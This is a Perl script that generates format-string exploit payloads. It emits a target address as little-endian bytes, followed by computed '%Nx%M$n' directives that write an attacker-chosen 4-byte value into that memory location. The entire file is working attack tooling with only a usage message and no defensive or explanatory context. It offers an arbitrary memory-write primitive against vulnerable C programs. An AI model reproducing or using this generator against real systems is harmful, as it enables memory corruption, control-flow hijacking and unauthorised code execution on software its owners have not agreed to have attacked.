#!/usr/bin/perl -w
#
# Syntax:
#   genformatstring.pl <4byte-overwrite-address> <withaddress>

use strict;
my @input = [];

if ($#ARGV < 1){
 print(STDERR "Syntax:\n 	./genformatstring.pl [--inline] <4byte-overwrite-address> <withaddress>\n");
 print(STDERR " 		--inline allows input from STDIN to preceed the format string\n\n");
 exit(1);
}

if ($ARGV[0] eq "--inline") {
 shift;
 @input = <STDIN>;
 
}

my $overwriteaddress = hex(shift);
my $withaddress = hex(shift);
my $offset = shift || length(@input);

printf(STDERR "%08x : %08x\n", $overwriteaddress, $withaddress,);



print(print_hex_reverse($overwriteaddress));
print(print_hex_reverse($overwriteaddress+1));
print(print_hex_reverse($overwriteaddress+2));
print(print_hex_reverse($overwriteaddress+3));
if ($#input > 0){
 for (@input) {
  print (STDOUT $_);
 }
}
print(print_format_string($withaddress,$offset));


sub print_hex_reverse {
 my $input = shift;
 my $output = "";
 
 my $inputstring = sprintf("%08x", $input);

 if (substr($inputstring,1,1) eq "x"){
  $input = substr($inputstring,2);
 }

 my $b1 = substr($inputstring,0,2);
 my $b2 = substr($inputstring,2,2);
 my $b3 = substr($inputstring,4,2);
 my $b4 = substr($inputstring,6,2);

 printf(STDERR "%02x%02x%02x%02x\n", hex($b4), hex($b3), hex($b2), hex($b1));
 return (chr(hex($b4)).chr(hex($b3)).chr(hex($b2)).chr(hex($b1)));
}

sub print_format_string {
 my $address = shift;
 my $offset = shift || 0;
 my $output = "";
 my $saddress = sprintf("%08x", $address);
 my $decimal = 0;
 
 if (substr($saddress,1,1) eq "x"){
  $saddress = substr($saddress,2);
 }
 my $b1 = substr($saddress,0,2);
 my $h1 = hex($b1);
 my $b2 = substr($saddress,2,2);
 my $h2 = hex($b2);
 my $b3 = substr($saddress,4,2);
 my $h3 = hex($b3);
 my $b4 = substr($saddress,6,2);
 my $h4 = hex($b4);
 
 $decimal = -16 - $offset + $h4;
 if ($decimal < 1){
  $decimal +=256;
 }
 $output .=  "%" .($decimal)."x%". (4+$offset) . '$n';

 $decimal = $h3-$h4;
 if ($decimal < 1){
  $decimal +=256;
 }
 $output .=  "%" .($decimal)."x%". (5+$offset) . '$n';

 $decimal = $h2-$h3;
 if ($decimal < 1){
  $decimal +=256;
 }
 $output .=  "%" .($decimal)."x%". (6+$offset) . '$n';

 $decimal = $h1-$h2;
 if ($decimal < 1){
  $decimal +=256;
 }
 $output .=  "%" .($decimal)."x%". (7+$offset) . '$n';

 return $output;
}
 
